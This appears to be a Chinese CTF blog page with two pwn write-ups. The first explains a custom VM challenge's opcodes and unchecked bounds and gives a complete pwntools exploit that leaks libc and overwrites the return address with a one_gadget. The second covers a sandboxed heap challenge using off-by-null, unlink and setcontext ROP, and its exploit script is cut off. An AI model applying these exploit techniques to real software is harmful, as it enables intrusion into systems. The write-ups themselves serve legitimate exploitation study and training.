<p>经过亿段时间的分析之后，我大概搞清楚了其中一些指令的含义。</p>
<p>在这个虚拟机中一共有6个word类型的寄存器，这6个寄存器通过偏移获取。在这16种指令中有加减乘除、与或异或等算数指令，这些指令需要3个操作数。格式为：（下面所有格式均为高地址到低地址，在写入时需要调换一下顺序）</p>
<blockquote>
<p>指令码: 2, 功能: 加法, 格式: op1 op2 op3 0x2——reg(op3) &#x3D; reg(op1) + reg(op2)<br>指令码: 3, 功能: 减法, 格式: op1 op2 op3 0x3——reg(op3) &#x3D; reg(op2) - reg(op1)<br>指令码: 4, 功能: 按位与, 格式: op1 op2 op3 0x4——reg(op3) &#x3D; reg(op2) &amp; reg(op1)<br>指令码: 5, 功能: 按位或, 格式: op1 op2 op3 0x5——reg(op3)&#x3D; reg(op2) | reg(op1)<br>指令码: 6, 功能: 右移, 格式: op1 op2 op3 0x6——reg(op3) &#x3D; reg(op3) &gt;&gt; reg(op2)<br>指令码: 7, 功能: 按位异或, 格式: op1 op2 op3 0x7——reg(op3) &#x3D; reg(op1) ^ reg(op2)<br>指令码: 13, 功能: 乘法, 格式: op1 op2 op3 0xD——reg(op3) &#x3D; reg(op1) * reg(op2) 【注意这里没有检查op2的范围，是一个漏洞】</p>
</blockquote>
<p>除此之外，还有一些其他类型的指令，这里也列举一下。</p>
<blockquote>
<p>指令码: 0, 功能: 退出, 格式: op1 op2 op3 0x0——exit()<br>指令码: 1, 功能: 赋值, 格式: op1 op2 op3 0x1——reg(op3) &#x3D; op1 + op2 &gt;&gt; 8 (op1 &#x3D; LOBYTE(op3), op2 &#x3D; HIBYTE(op3))<br>指令码: 9, 功能: 入栈, 格式: op1 op2 op3 0x9——若op3 &#x3D;&#x3D; 0则push (reg(0))，若op3 !&#x3D; 0则push (op1 + op2 &gt;&gt; 8) 【注意这里虽然有对栈是否满的检查，但是没有对op3大小的检查，可以push虚拟机空间之外的东西，是一个漏洞】<br>指令码: 10, 功能: 出栈, 格式: op1 op2 op3 0xA——reg(op3) &#x3D; pop()【这里有对op3大小和栈是否为空的检查】<br>指令码: 12, 功能: 比较两个寄存器的值是否相等。因为返回相等的控制位没有被其他指令所引用，因此这里不做分析。<br>指令码: 14, 功能: 寄存器赋值, 格式: op1 op2 op3 0xE——reg(op2) &#x3D; reg(op3)【注意这里没有检查op2是否为负数，是一个漏洞】<br>指令码: 15, 功能: 输出栈顶的值（这里指的是没有被占用的地方，也就是栈实际占用空间还往上一个字的值，这个字现在实际上并没有进入堆栈）</p>
</blockquote>
<p>还有8和11的指令码没有分析，不过从官方wp上看这两个应该是无关紧要的，就暂且不管了。</p>
<p>然后我们需要整理一下思路，想想如何才能利用上面的漏洞getshell。</p>
<p>要想getshell，首先要拿到libc加载地址，通过这个加载地址得到one_gadget的地址，然后需要将one_gadget地址写入返回地址中。整个过程看似简单，但首先第一个问题：如何拿到libc加载地址？</p>
<p>注意到赋值操作中目的操作数是没有检查负数的情况的，经过IDA调试发现栈指针在寄存器的低地址处，我们可以让目的操作数为负进而指向栈指针，这样我们就可以用寄存器中的值去覆盖栈指针的值。栈指针是一个8字节结构，对应赋值的偏移应为0xF6、0xF7、0xF8、0xF9，我们将0xF6偏移位置覆盖为0x8000即可让栈指针变为负数。在输出值（指令码0xF）时，这个最高位的0x8000会溢出，从而我们可以读取寄存器后面任何一个位置的地址。经过试验发现，栈指针为0x10C时对应main返回地址最低字，即__libc_start_main+243。我们读取0x10C、0x10D、0x10E三个字的值就可以完全掌握libc的加载地址了。注意这里读取不用0xF指令，因为它只有输出功能，等脚本读到输出之后你的小程序早就执行完了。因此这里使用pop指令，它只会检查栈指针是否为0，因此可以绕过。</p>
<p><img src="https://img-blog.csdnimg.cn/87837b63a1d84e62ba4ae3a8abf63b67.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
<p>在pop之后，我们获得了libc的加载地址，这里需要进行一些计算来获得one_gadget的地址。然后我们将其push到返回地址处就可以了。这里需要注意的是，由于每一个寄存器只有2字节长度，因此返回地址需要用3个寄存器存储，在计算的时候会忽略向高位的借位，因此可能在计算时出错，但这是一个小概率事件，大约有1&#x2F;4的概率会失败。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00005607BDE667A1 case_9:                                 ; *** code: 9</span><br><span class="line">.text:00005607BDE667A1 mov     rax, [rbp+var_230]              ;     function: if var_230(?) &lt;= 100h then exit</span><br><span class="line">.text:00005607BDE667A1                                         ;               else then ???</span><br><span class="line">.text:00005607BDE667A8 cmp     rax, 100h</span><br><span class="line">.text:00005607BDE667AE jle     short loc_5607BDE667BA</span><br><span class="line">.text:00005607BDE667B0 mov     edi, 0                          ; status</span><br><span class="line">.text:00005607BDE667B5 call    _exit</span><br></pre></td></tr></table></figure>

<p>请注意上面的代码片段，这是检查栈指针是否大于100。但是跳转是jle，这表示它是有符号的比较。那也就是说如果栈指针是一个负数，如果看做无符号数的话是一个很大的数，但也能通过检查，这就为我们写入返回地址创造了条件。</p>
<p>因此，大致的步骤就是：</p>
<p>Step 1: 修改栈指针到返回地址处<br>Step 2: 读取返回地址<br>Step 3: 计算one_gadget地址<br>Step 4: 写入返回地址<br>Step 5: getshell</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./mva&#x27;</span>)</span><br><span class="line">Libc_libc_start_main = <span class="number">0x23FC0</span></span><br><span class="line">Libc_one_gadget = <span class="number">0xE3B31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_command</span>(<span class="params">code, op1, op2, op3</span>):</span><br><span class="line">	<span class="keyword">return</span> p8(code) + p8(op1) + p8(op2) + p8(op3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">movl</span>(<span class="params">reg, value</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">1</span>, reg, value &gt;&gt; <span class="number">8</span>, value &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">dest, add1, add2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">2</span>, dest, add1, add2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">dest, subee, suber</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">3</span>, dest, subee, suber)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">band</span>(<span class="params">dest, and1, and2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">4</span>, dest, and1, and2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bor</span>(<span class="params">dest, or1, or2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">5</span>, dest, or1, or2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sar</span>(<span class="params">dest, off</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">6</span>, dest, off, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bxor</span>(<span class="params">dest, xor1, xor2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">7</span>, dest, xor1, xor2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">reg, value</span>):</span><br><span class="line">	<span class="keyword">if</span> reg == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> get_command(<span class="number">9</span>, reg, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> get_command(<span class="number">9</span>, reg, value &gt;&gt; <span class="number">8</span>, value &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">reg</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">10</span>, reg, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imul</span>(<span class="params">dest, imul1, imul2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">13</span>, dest, imul1, imul2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">src, dest</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">14</span>, src, dest, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_top</span>():</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: get __libc_start_main + 243</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += movl(<span class="number">0</span>, <span class="number">0x8000</span>)</span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0xF9</span>)			<span class="comment"># bypass the check by making it nagative</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">0</span>, <span class="number">0x010F</span>)</span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0xF6</span>)</span><br><span class="line">payload += pop(<span class="number">0</span>)				<span class="comment"># HIGH WORD of __libc_start_main</span></span><br><span class="line">payload += pop(<span class="number">1</span>)				<span class="comment"># MIDDLE WORD of __libc_start_main</span></span><br><span class="line">payload += pop(<span class="number">2</span>)				<span class="comment"># LOW WORD of __libc_start_main</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">243</span>)</span><br><span class="line">payload += sub(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)			<span class="comment"># this step may fail due to the ignorance of borrowed bit, but in 1/16 to fail</span></span><br><span class="line"><span class="comment"># __libc_start_main got</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x3FC0</span>)		<span class="comment"># this step may also fail due to same reason, 1/4 to fail until now</span></span><br><span class="line">payload += sub(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x2</span>)</span><br><span class="line">payload += sub(<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># libc load address got</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x3B31</span>)</span><br><span class="line">payload += add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0xE</span>)</span><br><span class="line">payload += add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># one_gadget address got</span></span><br><span class="line"></span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">payload += mov(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += mov(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += mov(<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># write one_gadget address to return_addr</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for c in payload:</span></span><br><span class="line"><span class="comment"># 	print(&#x27;%02x&#x27; % c, end=&#x27; &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+] Welcome to MVA, input your code now :&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/52020bea84744e0291879fb412482998.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
<p>当shell拿到之后，我们发现这种题目其实并不难，只要计算一下地址然后写入就行了。就是分析代码比较麻烦，需要明确每一种指令分别代表什么含义，找到里面的漏洞进而思考如何getshell。从这道题可以看出，vm-pwn题中最为致命的就是堆栈检查不严格，可能会产生任意地址读写漏洞，还有整型溢出问题也值得关注。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94babypwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94babypwn/" class="post-title-link" itemprop="url">强网杯2021 pwn 赛题解析——babypwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:06" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:06+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这道题增加了沙箱机制，通过seccomp-tools可以轻松获取沙箱的具体内容。</p>
<p><img src="https://img-blog.csdnimg.cn/7a4279ec88e74e9cb4d47dca9c3a0456.png"><br>其中的重点就是禁用了execve系统调用，无法直接通过one_gadget、system等直接getshell。这种情况下最为常用的利用方式就是set_context函数，具体如何利用，往下看。</p>
<p>本题的逆向分析很简单，注意bss中结构体的识别：前8字节是地址，后8字节是大小。在show函数中发现了一个简单的加密函数：</p>
<p><img src="https://img-blog.csdnimg.cn/d9ef1b3c1668495bb168ed3f51841a9c.png"><br>其每一轮的计算如下图所示，红色部分是因为溢出而无法计算的部分，每一轮的计算结果就相当于是所有黄色部分对应位异或的结果。<br><img src="https://img-blog.csdnimg.cn/f14dc06b21fd48248692237b77a64de6.png"><br>那么这个函数应该如何解密呢？观察到每一轮的计算又可以分为3小轮，最后一轮是某个值与自身左移13位的异或。第二轮是另外一个值与自身右移17位的异或得到第三轮的初始值。第一轮是输入与输入自身左移5位的异或得到第二轮的初始值。如此设计解密算法也就不难了，相信了解一些算法的读者都能编写脚本。解密函数如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_bits</span>(<span class="params">value, start, end</span>):</span><br><span class="line">    <span class="keyword">return</span> (value &gt;&gt; start) &amp; ((<span class="number">1</span> &lt;&lt; (end - start)) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        low13 = get_bits(value, <span class="number">0</span>, <span class="number">13</span>)</span><br><span class="line">        mid13 = get_bits(value, <span class="number">13</span>, <span class="number">26</span>)</span><br><span class="line">        mid13 ^= low13</span><br><span class="line">        high6 = get_bits(value, <span class="number">26</span>, <span class="number">32</span>)</span><br><span class="line">        high6 ^= get_bits(mid13, <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">        value = low13 + (mid13 &lt;&lt; <span class="number">13</span>) + (high6 &lt;&lt; <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">        high17 = get_bits(value, <span class="number">15</span>, <span class="number">32</span>)</span><br><span class="line">        low15 = get_bits(value, <span class="number">0</span>, <span class="number">15</span>)</span><br><span class="line">        low15 ^= get_bits(high17, <span class="number">2</span>, <span class="number">17</span>)</span><br><span class="line">        value = low15 + (high17 &lt;&lt; <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        first5 = get_bits(value, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        second5 = get_bits(value, <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">        second5 ^= first5</span><br><span class="line">        third5 = get_bits(value, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        third5 ^= second5</span><br><span class="line">        fourth5 = get_bits(value, <span class="number">15</span>, <span class="number">20</span>)</span><br><span class="line">        fourth5 ^= third5</span><br><span class="line">        fifth5 = get_bits(value, <span class="number">20</span>, <span class="number">25</span>)</span><br><span class="line">        fifth5 ^= fourth5</span><br><span class="line">        sixth5 = get_bits(value, <span class="number">25</span>, <span class="number">30</span>)</span><br><span class="line">        sixth5 ^= fifth5</span><br><span class="line">        last2 = get_bits(value, <span class="number">30</span>, <span class="number">32</span>)</span><br><span class="line">        last2 ^= get_bits(sixth5, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        value = first5 + (second5 &lt;&lt; <span class="number">5</span>) + (third5 &lt;&lt; <span class="number">10</span>) + (fourth5 &lt;&lt; <span class="number">15</span>) + \</span><br><span class="line">            (fifth5 &lt;&lt; <span class="number">20</span>) + (sixth5 &lt;&lt; <span class="number">25</span>) + (last2 &lt;&lt; <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>

<p>通过show函数，我们能够获取到堆块的地址。不过需要注意的是，show函数加密的并非堆块自身的地址，而是堆块前8字节的值。通过调试我们可以发现，在程序初始化时调用的seccomp系列函数会申请一些堆块，我们通过申请到这些堆块有可能使得堆块的前8字节是一个堆块地址，以此来获取堆区地址。</p>
<p>本题的libc环境是2.27版本，有机会改写钩子到setcontext函数【<strong>插一句：在笔者的2.31版本libc中，setcontext函数的栈迁移指令从<code>mov rsp, [rdi+0xA0]</code>被改成了<code>mov rsp,[rdx+0xA0]</code>，这使得本题在2.31环境下无法利用，因为在执行到这里的时候无法控制rdx的值</strong>】。自然而然地，我们容易想到使用unlink堆块重叠的利用方式。在chunk中写一个假chunk，在假chunk的prev_size写入这个chunk的地址，然后将fd和bk指针写到合适的位置，就能够触发unlink。和同年的easy_diary相比，利用难度还更低些。</p>
<p><img src="https://img-blog.csdnimg.cn/bbadd28a80ff448791bfc3028b498852.png"><br>这里需要注意一下edit函数中的一个看似奇怪的函数。这个函数在read之后调用，会将第一个出现的’\x11’字符替换为0x0。乍一看，这个字符并不是字符串的结束符，但转念一想，不难发现这是出题人在为我们创造off by null的条件：’\x11’很有可能是某个chunk的size的最低1字节。可以通过这个特性修改chunk的大小和prev_inuse位。由于chunk的大小被修改了，因此在这个chunk的最后面还需要写上一个有效的size值，最低位为1，以绕过检查。</p>
<p>在成功unlink之后，就可以利用堆块重叠修改tcache chunk的fd指针到__free_hook。将其改写到setcontext内部即可实现栈迁移。然后构造好ROP链，打开文件、读文件、写数据。在笔者的机器上，通过调试将rdx改为与rdi的值相等实现栈迁移，但不知何故打开flag文件总是失败。</p>
<p>exp:（基于20.04，且需要调试修改rdx的值）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./babypwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;../../../../ld/ld-2.27.so&#x27;, &#x27;./babypwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    lodword = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line">    lodword = decrypt(lodword)</span><br><span class="line">    hidword = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line">    hidword = decrypt(hidword)</span><br><span class="line">    <span class="keyword">return</span> lodword + (hidword &lt;&lt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bits</span>(<span class="params">value, start, end</span>):</span><br><span class="line">    <span class="keyword">return</span> (value &gt;&gt; start) &amp; ((<span class="number">1</span> &lt;&lt; (end - start)) - <span class="number">1</span>)</span><br><span 